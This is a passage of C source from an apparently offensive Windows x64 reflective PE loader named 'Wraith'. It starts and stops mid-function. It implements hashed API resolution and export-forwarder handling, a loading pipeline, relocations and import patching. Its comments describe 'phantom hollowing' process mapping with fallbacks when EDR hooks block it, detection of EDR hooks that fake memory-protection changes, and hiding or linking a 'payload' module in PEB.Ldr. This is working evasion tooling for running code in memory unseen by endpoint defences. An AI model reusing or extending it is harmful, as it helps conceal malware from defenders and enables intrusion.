                hi = (uintptr_t)(base + image_size);
            }
            size_t cap = (size_t)(hi - (uintptr_t)fwd);
            const char *dot = bounded_strchr(fwd, '.', cap);
            if (!dot || dot == fwd || dot[1] == '\0') {
                return WRAITH_E_IMP_FORWARDER_LOOP;
            }

            /* Build "<dll>.dll" for module lookup. */
            size_t dll_part = (size_t)(dot - fwd);
            if (dll_part > 64) {
                return WRAITH_E_IMP_FORWARDER_LOOP;
            }
            char fname[80];
            memcpy(fname, fwd, dll_part);
            memcpy(fname + dll_part, ".dll", 5);  /* incl. NUL */

            /* Resolve target DLL: PEB.Ldr first, LoadLibraryA fallback
             * (handles api-set schema entries). */
            void *dep = NULL;
            wraith_status_t rc = resolve_dependency(fname, &dep);
            if (rc != WRAITH_OK) {
                return rc;
            }

            /* Self-referencing api-set: LoadLibraryA returned the same
             * module we started from (e.g. kernel32 hosts an api-set whose
             * host is kernel32 again). Recursing would re-find the same
             * forwarder string and exhaust depth. Fall back to OS
             * GetProcAddress, which uses the api-set schema. */
            if (dep == module_base) {
                if (dot[1] == '#') {
                    const char *p = dot + 2;
                    size_t plen = bounded_strlen(p, cap - (size_t)(p - fwd));
                    uint32_t ord_val = 0;
                    for (size_t k = 0; k < plen; ++k) {
                        if (p[k] < '0' || p[k] > '9' || ord_val > 0xFFFFu) {
                            return WRAITH_E_IMP_FORWARDER_LOOP;
                        }
                        ord_val = ord_val * 10 + (uint32_t)(p[k] - '0');
                    }
                    return schema_aware_lookup(dep, NULL, (uint16_t)ord_val,
                                                1, out_proc);
                }
                return schema_aware_lookup(dep, dot + 1, 0, 0, out_proc);
            }

            if (dot[1] == '#') {
                /* Ordinal forwarder: "DLL.#NNN". Parse the integer
                 * (decimal, bounded) and recurse via ordinal. */
                const char *p = dot + 2;
                size_t plen = bounded_strlen(p, cap - (size_t)(p - fwd));
                if (plen == 0 || plen > 6) {
                    return WRAITH_E_IMP_FORWARDER_LOOP;
                }
                uint32_t ord_val = 0;
                for (size_t k = 0; k < plen; ++k) {
                    if (p[k] < '0' || p[k] > '9') {
                        return WRAITH_E_IMP_FORWARDER_LOOP;
                    }
                    ord_val = ord_val * 10 + (uint32_t)(p[k] - '0');
                    if (ord_val > 0xFFFFu) {
                        return WRAITH_E_IMP_FORWARDER_LOOP;
                    }
                }
                return lookup_ordinal_inner(dep, (uint16_t)ord_val,
                                             depth + 1, out_proc);
            }

            uint32_t func_hash = wr_djb2_a(dot + 1);
            return lookup_inner(dep, func_hash, depth + 1, out_proc);
        }

        *out_proc = candidate;
        return WRAITH_OK;
    }

    return WRAITH_E_RT_API_NOT_RESOLVED;
}

/* ------------------------------------------------------------------------ */
/*  Core lookup - by ordinal                                                */
/* ------------------------------------------------------------------------ */

static wraith_status_t lookup_ordinal_inner(void *module_base, uint16_t ordinal,
                                             int depth, void **out_proc)
{
    if (depth >= WRAITH_RESOLVER_MAX_FOLLOW) {
        return WRAITH_E_IMP_FORWARDER_LOOP;
    }
    if (!out_proc) {
        return WRAITH_E_NULL_ARG;
    }
    *out_proc = NULL;
    if (!wr_looks_like_valid_base(module_base)) {
        return WRAITH_E_NULL_ARG;
    }

    uint8_t *base = (uint8_t *)module_base;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        return WRAITH_E_RT_API_NOT_RESOLVED;
    }
    PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        return WRAITH_E_RT_API_NOT_RESOLVED;
    }
    DWORD image_size = nt->OptionalHeader.SizeOfImage;
    PIMAGE_DATA_DIRECTORY dir =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (dir->Size == 0) {
        return WRAITH_E_IMP_PROC_NOT_FOUND;
    }
    PIMAGE_EXPORT_DIRECTORY exp =
        (PIMAGE_EXPORT_DIRECTORY)(base + dir->VirtualAddress);

    if (ordinal < exp->Base) {
        return WRAITH_E_EXP_BAD_ORDINAL;
    }
    DWORD idx = (DWORD)(ordinal - exp->Base);
    if (idx >= exp->NumberOfFunctions) {
        return WRAITH_E_EXP_BAD_ORDINAL;
    }
    DWORD *funcs = (DWORD *)(base + exp->AddressOfFunctions);
    DWORD frva = funcs[idx];
    if (frva == 0 || frva >= image_size) {
        return WRAITH_E_IMP_PROC_NOT_FOUND;
    }

    void *candidate = base + frva;

    /* Forwarder detection identical to the by-name path. See
     * lookup_inner() for the full three-criteria rationale (export-dir
     * range, static section EXECUTE bit, live page protection). */
    int is_forwarder = forward_in_export_dir(base, dir, candidate)
                       || !rva_in_executable_section(base, frva)
                       || !page_is_executable(candidate);

    if (is_forwarder) {
        const char *fwd = (const char *)candidate;
        uintptr_t hi = (uintptr_t)(base + dir->VirtualAddress + dir->Size);
        if ((uintptr_t)fwd >= hi) {
            /* Out-of-export-dir forwarder; widen the search cap to the
             * end of the image. bounded_strchr stops at the first NUL. */
            hi = (uintptr_t)(base + image_size);
        }
        size_t cap = (size_t)(hi - (uintptr_t)fwd);
        const char *dot = bounded_strchr(fwd, '.', cap);
        if (!dot || dot == fwd || dot[1] == '\0') {
            return WRAITH_E_IMP_FORWARDER_LOOP;
        }
        size_t dll_part = (size_t)(dot - fwd);
        if (dll_part > 64) {
            return WRAITH_E_IMP_FORWARDER_LOOP;
        }
        char fname[80];
        memcpy(fname, fwd, dll_part);
        memcpy(fname + dll_part, ".dll", 5);

        void *dep = NULL;
        wraith_status_t rc = resolve_dependency(fname, &dep);
        if (rc != WRAITH_OK) {
            return rc;
        }

        /* Self-referencing api-set self-host (see lookup_inner for rationale). */
        if (dep == module_base) {
            if (dot[1] == '#') {
                const char *p = dot + 2;
                size_t plen = bounded_strlen(p, cap - (size_t)(p - fwd));
                uint32_t ord_val = 0;
                for (size_t k = 0; k < plen; ++k) {
                    if (p[k] < '0' || p[k] > '9' || ord_val > 0xFFFFu) {
                        return WRAITH_E_IMP_FORWARDER_LOOP;
                    }
                    ord_val = ord_val * 10 + (uint32_t)(p[k] - '0');
                }
                return schema_aware_lookup(dep, NULL, (uint16_t)ord_val,
                                            1, out_proc);
            }
            return schema_aware_lookup(dep, dot + 1, 0, 0, out_proc);
        }

        if (dot[1] == '#') {
            const char *p = dot + 2;
            size_t plen = bounded_strlen(p, cap - (size_t)(p - fwd));
            if (plen == 0 || plen > 6) {
                return WRAITH_E_IMP_FORWARDER_LOOP;
            }
            uint32_t ord_val = 0;
            for (size_t k = 0; k < plen; ++k) {
                if (p[k] < '0' || p[k] > '9') {
                    return WRAITH_E_IMP_FORWARDER_LOOP;
                }
                ord_val = ord_val * 10 + (uint32_t)(p[k] - '0');
                if (ord_val > 0xFFFFu) {
                    return WRAITH_E_IMP_FORWARDER_LOOP;
                }
            }
            return lookup_ordinal_inner(dep, (uint16_t)ord_val,
                                         depth + 1, out_proc);
        }

        uint32_t func_hash = wr_djb2_a(dot + 1);
        return lookup_inner(dep, func_hash, depth + 1, out_proc);
    }

    *out_proc = candidate;
    return WRAITH_OK;
}

/* ------------------------------------------------------------------------ */
/*  Public API                                                              */
/* ------------------------------------------------------------------------ */

wraith_status_t wr_resolver_lookup(void *module_base, uint32_t name_hash,
                                    void **out_proc)
{
    return lookup_inner(module_base, name_hash, 0, out_proc);
}

wraith_status_t wr_resolver_lookup_a(void *module_base, const char *name,
                                      void **out_proc)
{
    if (!name) {
        return WRAITH_E_NULL_ARG;
    }
    return lookup_inner(module_base, wr_djb2_a(name), 0, out_proc);
}

wraith_status_t wr_resolver_lookup_ordinal(void *module_base, uint16_t ordinal,
                                            void **out_proc)
{
    return lookup_ordinal_inner(module_base, ordinal, 0, out_proc);
}


/* ==========================================================================
 * src/stealth/hashing/hash_djb2.c
 * ========================================================================== */

/*
 * src/stealth/hashing/hash_djb2.c
 *
 * The four entry points (a/a_n/w/w_n) share an inline core. The lower-
 * case fold is restricted to the ASCII A..Z range so the hash stays
 * stable across system locales (and matches what tools/hashgen.py
 * produces - any divergence between compile-time and runtime hashing
 * silently breaks resolution, so the Python implementation MUST mirror
 * this exact arithmetic).
 */

static inline uint32_t fold_ascii(uint32_t c)
{
  if (c >= 0x41u && c <= 0x5Au) {  /* 'A' .. 'Z' */
  c += 0x20u;
  }
  return c;
}

uint32_t wr_djb2_a(const char *s)
{
  if (!s) {
  return 0;
  }
  uint32_t h = 5381u;
  for (; *s; ++s) {
  uint32_t c = (uint8_t)*s;
  h = ((h << 5) + h) + fold_ascii(c);
  }
  return h;
}

uint32_t wr_djb2_a_n(const char *s, size_t n)
{
  if (!s) {
  return 0;
  }
  uint32_t h = 5381u;
  for (size_t i = 0; i < n; ++i) {
  uint32_t c = (uint8_t)s[i];
  h = ((h << 5) + h) + fold_ascii(c);
  }
  return h;
}

uint32_t wr_djb2_w(const wchar_t *s)
{
  if (!s) {
  return 0;
  }
  uint32_t h = 5381u;
  for (; *s; ++s) {
  uint32_t c = (uint32_t)*s;
  h = ((h << 5) + h) + fold_ascii(c);
  }
  return h;
}

uint32_t wr_djb2_w_n(const wchar_t *s, size_t n)
{
  if (!s) {
  return 0;
  }
  uint32_t h = 5381u;
  for (size_t i = 0; i < n; ++i) {
  uint32_t c = (uint32_t)s[i];
  h = ((h << 5) + h) + fold_ascii(c);
  }
  return h;
}


/* ==========================================================================
 * src/loader/loader_pipeline.c
 * ========================================================================== */

/*
 * src/loader/loader_pipeline.c
 *
 * Top-level orchestrator. The 17-step pipeline from doc/ARCHITECTURE.md
 * is implemented here as a linear sequence of phase calls; on any failure
 * we run wr_pipeline_unwind to reverse what's been done so far.
 */







#if WRAITH_USE_PEB_LINKAGE

#endif

#include <stdlib.h>
#include <string.h>

#define WRAITH_PIPE_STEP(ctx, id, name, expr) do {  \
  wraith_status_t _rc = (expr);  \
  wr_trace((ctx), (id), (name), _rc);  \
  if (_rc != WRAITH_OK) {  \
  return _rc;  \
  }  \
  } while (0)

void wr_trace(struct wr_ctx *ctx, int phase_id, const char *phase_name,
  wraith_status_t status)
{
  if (ctx && ctx->trace) {
  ctx->trace(phase_id, phase_name, status, ctx->trace_userdata);
  }
}

wraith_status_t wr_pipeline_run(const void *buffer, size_t size,
  struct wr_ctx *ctx)
{
  if (!buffer || size == 0 || !ctx) {
  return WRAITH_E_NULL_ARG;
  }

  /* [1] Validate PE -------------------------------------------------- */
  wr_pe_view view;
  WRAITH_PIPE_STEP(ctx, 1, "validate",
  wr_pe_validate(buffer, size, &view));

  /* [2] Image metrics ----------------------------------------------- */
  wr_pe_image_metrics metrics;
  WRAITH_PIPE_STEP(ctx, 2, "metrics",
  wr_pe_compute_metrics(&view, ctx->page_size, &metrics));

  ctx->image_size = metrics.aligned_image_size;
  ctx->image_type = view.is_dll ? WRAITH_IMAGE_DLL : WRAITH_IMAGE_EXE;

  /* [3] Runtime + [4] mapping strategy resolution ------------------- */
  ctx->rt_ops  = wr_rt_resolve(ctx);
  ctx->map_ops = wr_map_resolve(ctx->map_strategy);
  if (!ctx->map_ops) {
  return wr_ctx_fail(ctx, WRAITH_E_INVALID_OPTIONS,
  "mapping strategy %d unavailable in this build",
  (int)ctx->map_strategy);
  }
  wr_trace(ctx, 3, "runtime", WRAITH_OK);
  wr_trace(ctx, 4, "map_resolve", WRAITH_OK);

  /* [5] Reserve image ----------------------------------------------- */
  void *base = NULL;
  wraith_status_t reserve_rc =
  ctx->map_ops->reserve(ctx, metrics.aligned_image_size, &base);

#if WRAITH_USE_PHANTOM_HOLLOWING
  /* Runtime auto-degradation: when the user asked for PHANTOM_HOLLOW
   * but the actual reserve failed (kernel veto, EDR hook synthesizing
   * an error, mitigation we didn't probe for), silently retry with
   * private_rwx. The pre-flight probe in wr_map_resolve catches most
   * Chrome / Edge cases up front; this is the safety net for the rest. */
  if (reserve_rc != WRAITH_OK
      && ctx->map_strategy == WRAITH_MAP_PHANTOM_HOLLOW
      && ctx->map_ops != &wr_map_ops_private_rwx) {
  wr_phantom_mark_blocked();
  if (ctx->map_ops->destroy) {
  ctx->map_ops->destroy(ctx);
  }
  ctx->map_ops = &wr_map_ops_private_rwx;
  base = NULL;
  reserve_rc = ctx->map_ops->reserve(ctx,
  metrics.aligned_image_size, &base);
  }
#endif

  WRAITH_PIPE_STEP(ctx, 5, "reserve", reserve_rc);
  ctx->image_base = (uint8_t *)base;

  /* [7] Copy headers + sections ------------------------------------- */
  WRAITH_PIPE_STEP(ctx, 7, "copy_sections",
  wr_load_sections_copy(ctx, &view));

  /* [8] Base relocations -------------------------------------------- */
  WRAITH_PIPE_STEP(ctx, 8, "relocs",
  wr_load_relocs_apply(ctx, &view));

  /* [9a] Bound imports (policy: skip) ------------------------------- */
#if WRAITH_BOUND_IMPORTS
  WRAITH_PIPE_STEP(ctx, 9, "bound_imports",
  wr_load_imports_bound_check(ctx));
#endif

  /* [9b] Normal imports --------------------------------------------- */
  WRAITH_PIPE_STEP(ctx, 9, "imports",
  wr_load_imports_resolve(ctx, &view));

  /* [9c] Delay-load imports ----------------------------------------- */
#if WRAITH_DELAY_LOAD_IMPORTS
  WRAITH_PIPE_STEP(ctx, 9, "delay_imports",
  wr_load_imports_delay(ctx));
#endif

  /* [10] Finalize sections (RW -> RX/R/RW) -------------------------- */
  WRAITH_PIPE_STEP(ctx, 10, "finalize",
  wr_load_finalize_sections(ctx, &view));

  /* [12] x64 SEH registration --------------------------------------- */
  WRAITH_PIPE_STEP(ctx, 12, "seh_x64",
  wr_load_register_seh_x64(ctx));

  /* [14] TLS callbacks --------------------------------------------- */
  WRAITH_PIPE_STEP(ctx, 14, "tls_attach",
  wr_load_run_tls_attach(ctx, &view));

  /* [15] DllMain / EXE entry --------------------------------------- */
  WRAITH_PIPE_STEP(ctx, 15, "entry",
  wr_load_run_entry(ctx));

  /* [13] PEB.Ldr linkage runs *after* DllMain/init. Inserting before
  * init breaks Rust / C++ runtimes that walk PEB.Ldr during their own
  * startup; deferring lets the payload finish initializing on the
  * unmodified list and still be visible to subsequent enumerators
  * (EnumProcessModulesEx, GetModuleHandleW, dump tools). */
#if WRAITH_USE_PEB_LINKAGE
  WRAITH_PIPE_STEP(ctx, 13, "peb_link",
  wr_peb_link_install(ctx));
#endif

  return WRAITH_OK;
}

void wr_pipeline_unwind(struct wr_ctx *ctx)
{
  if (!ctx) {
  return;
  }

  /* Symmetric with the deferred install order: install runs after
  * DllMain ATTACH, so unlink runs before DllMain DETACH. This way
  * the payload's runtime, if it walks PEB.Ldr during its own
  * shutdown, sees the same list it saw at init. */
#if WRAITH_USE_PEB_LINKAGE
  wr_peb_link_remove(ctx);
#endif

  wr_load_run_entry_detach(ctx);
  wr_load_run_tls_detach(ctx);

  /* Unregister SEH unwind tables *before* releasing memory; the
  * function table pointer must still be valid for RtlDeleteFunctionTable. */
  wr_load_unregister_seh_x64(ctx);

  /* Free imported dependencies. */
  if (ctx->imported_modules) {
  for (uint32_t i = 0; i < ctx->imported_count; ++i) {
  if (ctx->imported_owned && ctx->imported_owned[i] &&
  ctx->imported_modules[i]) {
  if (ctx->rt_ops && ctx->rt_ops->free_library) {
  ctx->rt_ops->free_library(ctx, ctx->imported_modules[i]);
  }
  }
  }
  free(ctx->imported_modules);
  free(ctx->imported_owned);
  ctx->imported_modules = NULL;
  ctx->imported_owned  = NULL;
  ctx->imported_count  = 0;
  }

  /* Release mapped image. */
  if (ctx->map_ops) {
  ctx->map_ops->release(ctx);
  if (ctx->map_ops->destroy) {
  ctx->map_ops->destroy(ctx);
  }
  }
  ctx->image_base = NULL;
  ctx->image_size = 0;

  /* Cached export table. */
  free(ctx->export_table);
  ctx->export_table = NULL;
}


/* ==========================================================================
 * src/loader/loader_sections.c
 * ========================================================================== */

/*
 * src/loader/loader_sections.c
 *
 * Copy each PE section from the source buffer into the loaded image.
 * Sections without raw data still consume virtual space (BSS, etc.) -
 * the mapping vtable is responsible for committing them as zeroed RW.
 */






#include <string.h>

wraith_status_t wr_load_sections_copy(struct wr_ctx *ctx,
  const wr_pe_view *src)
{
  if (!ctx || !src || !src->nt || !src->dos) {
  return WRAITH_E_NULL_ARG;
  }
  if (!wr_looks_like_valid_base(ctx->image_base)) {
  return wr_ctx_fail(ctx, WRAITH_E_INVALID_HANDLE,
  "copy_sections: image_base=%p is not a valid mapping",
  (void *)ctx->image_base);
  }

  /* Copy headers first - the loaded image must have a valid PE header
  * at offset 0 so the rest of the loader can keep using ctx->headers. */
  size_t hdr_sz = src->nt->OptionalHeader.SizeOfHeaders;
  memcpy(ctx->image_base, src->buffer, hdr_sz);

  /* Read-back validation: under phantom_hollow the destination is a
  * SEC_IMAGE view that started in PAGE_EXECUTE_WRITECOPY. The bulk
  * RW flip in ph_reserve normally promotes those pages to plain
  * PAGE_READWRITE so memcpy generates clean private pages. Some
  * Win11 24H2 EDR hooks have been observed acknowledging the
  * NtProtect with STATUS_SUCCESS without actually flipping the
  * page; the memcpy then no-ops silently and we end up reading the
  * host's original bytes instead of the payload's. Detect that
  * here by re-reading the magic. */
  uint16_t mz_check = 0;
  memcpy(&mz_check, ctx->image_base, sizeof(mz_check));
  if (mz_check != WRAITH_PE_DOS_SIGNATURE) {
  return wr_ctx_fail(ctx, WRAITH_E_MAP_PROTECT_FAILED,
  "copy_sections: header memcpy did not stick "
  "(read-back magic=0x%04x; CoW protection flip likely "
  "intercepted)", (unsigned)mz_check);
  }

  /* Re-point ctx->headers at the *copied* NT headers so subsequent
  * phases (relocs, imports, exports) read them from the loaded
  * image. We also patch the ImageBase field to reflect the actual
  * load address. */
  if (src->dos->e_lfanew <= 0 ||
      (size_t)src->dos->e_lfanew + sizeof(wr_pe_nt_headers64) > hdr_sz) {
  return wr_ctx_fail(ctx, WRAITH_E_PE_BAD_DOS_MAGIC,
  "copy_sections: e_lfanew=%ld out of headers range",
  (long)src->dos->e_lfanew);
  }
  wr_pe_nt_headers64 *nt_in_image =
  (wr_pe_nt_headers64 *)(ctx->image_base + src->dos->e_lfanew);
  nt_in_image->OptionalHeader.ImageBase = (uint64_t)(uintptr_t)ctx->image_base;
  ctx->headers = nt_in_image;

  /* Copy each section. */
  wr_pe_section_iter it;
  wr_pe_section_iter_init(&it, src);
  const wr_pe_section_header *s;

  while ((s = wr_pe_section_iter_next(&it)) != NULL) {
  uint8_t *dest = ctx->image_base + s->VirtualAddress;

  if (s->SizeOfRawData == 0) {
  /* BSS-style section. The mapping reserve already committed
  * the whole image, so just zero it. */
  uint32_t vsize = s->VirtualSize ? s->VirtualSize
  : src->nt->OptionalHeader.SectionAlignment;
  memset(dest, 0, vsize);
  continue;
  }

  /* Bounds-check raw data against the source buffer (the validator
  * already did this, but re-asserting protects against memory
  * corruption between phases). */
  size_t raw_end = (size_t)s->PointerToRawData + (size_t)s->SizeOfRawData;
  if (raw_end > src->buffer_size) {
  return wr_ctx_fail(ctx, WRAITH_E_PE_TRUNCATED,
  "section %u raw data out of bounds",
  (unsigned)(s - src->sections));
  }

  memcpy(dest, src->buffer + s->PointerToRawData, s->SizeOfRawData);
  }

  return WRAITH_OK;
}


/* ==========================================================================
 * src/loader/loader_relocs.c
 * ========================================================================== */

/*
 * src/loader/loader_relocs.c
 *
 * Apply x64 base relocations (IMAGE_REL_BASED_DIR64). x86 HIGHLOW is
 * intentionally rejected - v2 is x64-only. ARM64 (THUMB_MOV32) lands in
 * v2.1 if scope permits.
 */





wraith_status_t wr_load_relocs_apply(struct wr_ctx *ctx,
  const wr_pe_view *src)
{
  if (!ctx || !src) {
  return WRAITH_E_NULL_ARG;
  }
  if (!wr_looks_like_valid_base(ctx->image_base) ||
      !wr_looks_like_valid_base(ctx->headers)) {
  return wr_ctx_fail(ctx, WRAITH_E_INVALID_HANDLE,
  "relocs: invalid image_base=%p / headers=%p",
  (void *)ctx->image_base, ctx->headers);
  }

  const wr_pe_nt_headers64 *nt =
  (const wr_pe_nt_headers64 *)ctx->headers;

  int64_t delta = (int64_t)((uintptr_t)ctx->image_base) -
  (int64_t)(src->nt->OptionalHeader.ImageBase);

  if (delta == 0) {
  ctx->is_relocated = 1;
  return WRAITH_OK;
  }

  /* Honor IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE only at the validation
  * layer; here we just check the directory exists. */
  uint32_t reloc_rva  = 0;
  uint32_t reloc_size = 0;
  (void)wr_pe_get_data_directory(src, WRAITH_PE_DIR_BASERELOC,
  &reloc_rva, &reloc_size);
  if (reloc_size == 0) {
  return wr_ctx_fail(ctx, WRAITH_E_RELOC_NOT_RELOCATABLE,
  "image not relocatable but base differs by %lld",
  (long long)delta);
  }
  (void)nt;  /* not strictly needed - we walk the in-image reloc dir */

  /* The reloc table in the *loaded image* lives at image_base + reloc_rva. */
  const uint8_t *block_base = ctx->image_base + reloc_rva;
  const uint8_t *block_end  = block_base + reloc_size;
  const wr_pe_base_relocation *block =
  (const wr_pe_base_relocation *)block_base;

  while ((const uint8_t *)block < block_end) {
  if (block->VirtualAddress == 0 || block->SizeOfBlock < 8) {
  break;
  }
  const uint16_t *entries = wr_pe_reloc_entries(block);
  uint32_t count = wr_pe_reloc_entry_count(block);

  uint8_t *patch_base = ctx->image_base + block->VirtualAddress;

  for (uint32_t i = 0; i < count; ++i) {
  uint16_t e = entries[i];
  uint16_t type  = wr_pe_reloc_entry_type(e);
  uint16_t offset = wr_pe_reloc_entry_offset(e);

  switch (type) {
  case WRAITH_PE_REL_ABSOLUTE:
  /* No-op padding entry. */
  break;
  case WRAITH_PE_REL_DIR64: {
  uint64_t *target = (uint64_t *)(patch_base + offset);
  *target = (uint64_t)((int64_t)*target + delta);
  break;
  }
  case WRAITH_PE_REL_HIGHLOW:
  /* x86 only - reject. */
  return wr_ctx_fail(ctx, WRAITH_E_RELOC_BAD_TYPE,
  "x86 HIGHLOW relocation in x64 image");
  default:
  return wr_ctx_fail(ctx, WRAITH_E_RELOC_BAD_TYPE,
  "unsupported reloc type %u", type);
  }
  }

  block = (const wr_pe_base_relocation *)
  ((const uint8_t *)block + block->SizeOfBlock);
  }

  ctx->is_relocated = 1;
  return WRAITH_OK;
}


/* ==========================================================================
 * src/loader/loader_imports.c
 * ========================================================================== */

/*
 * src/loader/loader_imports.c
 *
 * Walk IMAGE_DIRECTORY_ENTRY_IMPORT, resolve each dependency through the
 * runtime vtable, and patch the IAT in place.
 *
 * Scope of this file:
 *   - Normal imports (by name + by ordinal)
 *   - Forwarded exports inside imported DLLs are followed implicitly
 *     by GetProcAddress / the resolver path
 *
 * Bound and delay imports live in `loader_imports_bound.c` and
 * `loader_imports_delay.c` respectively.
 */




#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#include <winnt.h>

#define IMAGE_ORDINAL_FLAG64_LOCAL 0x8000000000000000ULL

static int snap_by_ordinal(uint64_t thunk)
{
  return (thunk & IMAGE_ORDINAL_FLAG64_LOCAL) != 0;
}

static uint16_t ordinal_of(uint64_t thunk)
{
  return (uint16_t)(thunk & 0xffff);
}

wraith_status_t wr_load_imports_resolve(struct wr_ctx *ctx,
  const wr_pe_view *src)
{
  if (!ctx || !src) {
  return WRAITH_E_NULL_ARG;
  }
  if (!wr_looks_like_valid_base(ctx->image_base) ||
      !wr_looks_like_valid_base(ctx->headers)) {
  return wr_ctx_fail(ctx, WRAITH_E_INVALID_HANDLE,
  "imports: invalid image_base=%p / headers=%p",
  (void *)ctx->image_base, ctx->headers);
  }

  PIMAGE_DATA_DIRECTORY dir = NULL;
  PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)ctx->headers;
  dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
  if (dir->Size == 0) {
  return WRAITH_OK;  /* no imports - perfectly legal */
  }

  PIMAGE_IMPORT_DESCRIPTOR desc =
  (PIMAGE_IMPORT_DESCRIPTOR)(ctx->image_base + dir->VirtualAddress);

  const struct wr_rt_ops *rt = ctx->rt_ops ? ctx->rt_ops
  : wr_rt_resolve(ctx);
  ctx->rt_ops = rt;

  while (desc->Name != 0) {
  const char *dll_name = (const char *)(ctx->image_base + desc->Name);

  wraith_foreign_module_t foreign = NULL;
  wraith_status_t rc = rt->load_library(ctx, dll_name, &foreign);
  if (rc != WRAITH_OK) {
  return rc;
  }
  if (!wr_looks_like_valid_base(foreign)) {
  /* The runtime claimed success but handed back an unusable
  * handle. Refuse rather than feed it to get_proc, which would
  * deref a near-NULL pointer reading the export table. */
  return wr_ctx_fail(ctx, WRAITH_E_IMP_DLL_NOT_FOUND,
  "imports: load_library(\"%s\") returned invalid base %p",
  dll_name, (void *)foreign);
  }

  /* Track for cleanup in wraith_free_library. */
  size_t newcap = ctx->imported_count + 1;
  wraith_foreign_module_t *grown =
  (wraith_foreign_module_t *)realloc(ctx->imported_modules,
  newcap * sizeof(*grown));
  bool *owned_grown =
  (bool *)realloc(ctx->imported_owned, newcap * sizeof(*owned_grown));
  if (!grown || !owned_grown) {
  free(grown);
  free(owned_grown);
  rt->free_library(ctx, foreign);
  return wr_ctx_fail(ctx, WRAITH_E_OOM, "imports: realloc tracking");
  }
  ctx->imported_modules  = grown;
  ctx->imported_owned  = owned_grown;
  ctx->imported_modules[ctx->imported_count] = foreign;
  ctx->imported_owned[ctx->imported_count]  = true;
  ctx->imported_count = (uint32_t)newcap;

  uint64_t *thunk_ref;
  void  **func_ref;

  if (desc->OriginalFirstThunk) {
  thunk_ref = (uint64_t *)(ctx->image_base + desc->OriginalFirstThunk);
  func_ref  = (void **)(ctx->image_base + desc->FirstThunk);
  } else {
  /* No hint table - thunks live in IAT directly. */
  thunk_ref = (uint64_t *)(ctx->image_base + desc->FirstThunk);
  func_ref  = (void **)(ctx->image_base + desc->FirstThunk);
  }

  while (*thunk_ref) {
  void *resolved = NULL;
  if (snap_by_ordinal(*thunk_ref)) {
  /* GetProcAddress accepts (LPCSTR)MAKEINTRESOURCE(ord) - we
  * forward this idiom through the vtable by passing the
  * ordinal in the lower 16 bits and letting the rt know. */
  const char *as_ord =
  (const char *)(uintptr_t)ordinal_of(*thunk_ref);
  rc = rt->get_proc(ctx, foreign, as_ord, &resolved);
  } else {
  PIMAGE_IMPORT_BY_NAME by_name =
  (PIMAGE_IMPORT_BY_NAME)(ctx->image_base + *thunk_ref);
  rc = rt->get_proc(ctx, foreign, (const char *)by_name->Name,
  &resolved);
  }
  if (rc != WRAITH_OK || !resolved) {
  return rc != WRAITH_OK ? rc
  : wr_ctx_fail(ctx,
  WRAITH_E_IMP_PROC_NOT_FOUND,
  "import resolution NULL");
  }
  *func_ref = resolved;
  ++thunk_ref;
  ++func_ref;
  }
  ++desc;
  }

  return WRAITH_OK;
}


/* ==========================================================================
 * src/loader/loader_imports_bound.c
 * ========================================================================== */

/*
 * src/loader/loader_imports_bound.c
 *
 * Bound-import policy: ignore the timestamp/checksum payload, ALWAYS
 * resolve imports normally.
 *
 * Why: bound imports rely on the loader trusting that the dependency
 * DLL resides at the exact base address the linker assumed. Under ASLR
 * (mandatory since Win10) this assumption is essentially never true,
 * so honoring the bound IAT would yield invalid pointers. Modern
 * toolchains have stopped emitting them by default.
 *
 * This module exists as a documented no-op so that future scope
 * (e.g. rebasing-aware delay imports) has a natural home.
 */


#include <windows.h>

wraith_status_t wr_load_imports_bound_check(struct wr_ctx *ctx)
{
  if (!ctx) {
  return WRAITH_E_NULL_ARG;
  }
  PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)ctx->headers;
  PIMAGE_DATA_DIRECTORY dir =
  &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT];
  /* If the linker emitted a bound table at all, leave a breadcrumb in
  * the trace channel but do not honor it. */
  if (dir->Size != 0) {
  wr_trace(ctx, 9, "bound_imports_skip", WRAITH_OK);
  }
  return WRAITH_OK;
}


/* ==========================================================================
 * src/loader/loader_imports_delay.c
 * ========================================================================== */

/*
 * src/loader/loader_imports_delay.c
 *
 * Eagerly resolve IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT entries.
 *
 * The Microsoft delay-load mechanism normally defers resolution until
 * the first call site invokes __delayLoadHelper2. We instead resolve
 * everything up-front and patch the IAT, which:
 *  - keeps the loader self-contained (no helper stub injection)
 *  - guarantees deterministic state for subsequent stealth phases
 *  (stack spoofing relies on knowing all call targets)
 *
 * Layout (PE32+ V2 with bit 0 of grAttrs set - the only modern variant):
 *
 *  typedef struct ImgDelayDescr {
 *  DWORD grAttrs;  // bit 0 set => RVAs (V2). bit 0 clear => VAs (V1).
 *  DWORD rvaDLLName;
 *  DWORD rvaHmod;  // storage for HMODULE - we write our handle
 *  DWORD rvaIAT;  // patched in place
 *  DWORD rvaINT;  // hint/name table read for resolution
 *  DWORD rvaBoundIAT;  // ignored
 *  DWORD rvaUnloadIAT;  // ignored
 *  DWORD dwTimeStamp;  // 0 if not bound
 *  } ImgDelayDescr;
 */



#include <stdlib.h>
#include <windows.h>

#define IMAGE_ORDINAL_FLAG64_LOCAL 0x8000000000000000ULL

#pragma pack(push, 1)
typedef struct wr_delay_descr {
  DWORD grAttrs;
  DWORD rvaDLLName;
  DWORD rvaHmod;
  DWORD rvaIAT;
  DWORD rvaINT;
  DWORD rvaBoundIAT;
  DWORD rvaUnloadIAT;
  DWORD dwTimeStamp;
} wr_delay_descr;
#pragma pack(pop)

#define WRAITH_DELAY_ATTR_RVA  0x00000001u

wraith_status_t wr_load_imports_delay(struct wr_ctx *ctx)
{
  if (!ctx) {
  return WRAITH_E_NULL_ARG;
  }

  PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)ctx->headers;
  PIMAGE_DATA_DIRECTORY dir =
